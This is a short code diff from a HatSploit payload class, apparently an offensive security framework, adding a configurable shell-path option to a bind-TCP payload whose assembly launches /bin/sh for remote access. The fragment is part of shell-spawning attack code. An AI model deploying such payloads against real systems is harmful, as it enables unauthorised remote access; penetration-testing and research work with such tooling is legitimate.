@@ -23,13 +23,16 @@ class HatSploitPayload(Payload, Handler):
             'Type': BIND_TCP,
         })
 
+        self.shell = Option('SHELL', '/bin/sh', "Executable path.", True,
+                            advanced=True)
+
     def implant(self):
         return self.assemble(
-            """
+            f"""
             bl start
 
             path:
-                .asciz "/bin/sh"
+                .asciz "{self.shell.value}"
 
             start:
                 mov x1, 0x3
